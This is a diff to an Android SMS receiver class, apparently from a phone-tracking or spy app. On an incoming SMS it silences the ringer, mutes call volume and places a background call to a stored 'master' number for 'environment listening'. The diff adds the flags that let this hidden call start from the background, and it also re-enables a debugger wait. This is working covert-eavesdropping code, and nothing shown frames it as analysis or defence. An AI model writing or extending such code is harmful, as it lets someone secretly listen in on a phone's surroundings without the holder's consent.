@@ -67,7 +67,6 @@ public class SmsReceiver extends BroadcastReceiver
 	private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
 	private Context context;
 	
-	public static boolean IS_ENV_LISTENING = false;
 	public static int ORIGINAL_RING_MODE;
 	public static int ORIGINAL_RING_VOL;
 	public static int ORIGINAL_VOICE_CALL_VOL;
@@ -79,7 +78,7 @@ public class SmsReceiver extends BroadcastReceiver
 	@Override
 	public void onReceive(Context context, Intent intent) 
 	{
-		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
+		android.os.Debug.waitForDebugger();//TODO should be removed in the release
 		
 		if (intent.getAction().equals(SMS_RECEIVED)) 
 		{
@@ -234,18 +233,21 @@ public class SmsReceiver extends BroadcastReceiver
 		        		am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
 						
 						// Lower phone call volume to min
-						int ORIGINAL_VOICE_CALL_VOL = am.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
+						ORIGINAL_VOICE_CALL_VOL = am.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
 						am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, 0, 0);
-						
-						IS_ENV_LISTENING = true;
 						
 						// Call master phone
 						String masterPhone = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
-						Uri uri = Uri.parse("tel:" + masterPhone);			             
-						SmsReceiver.this.context.startActivity(new Intent(Intent.ACTION_CALL, uri));
+						Uri uri = Uri.parse("tel:" + masterPhone);			          
+						Intent intent = new Intent(Intent.ACTION_CALL, uri);
+						intent.addFlags(Intent.FLAG_FROM_BACKGROUND); 
+						intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
+						SmsReceiver.this.context.startActivity(intent);
+						
+						GlobalValues.IS_ENV_LISTENING = true;
 						
 						// Turn off screen
-						PowerUtil.setScreenOff(SmsReceiver.this.context);
+						//PowerUtil.setScreenOff(SmsReceiver.this.context);
 					}
 				}).start();
 			}
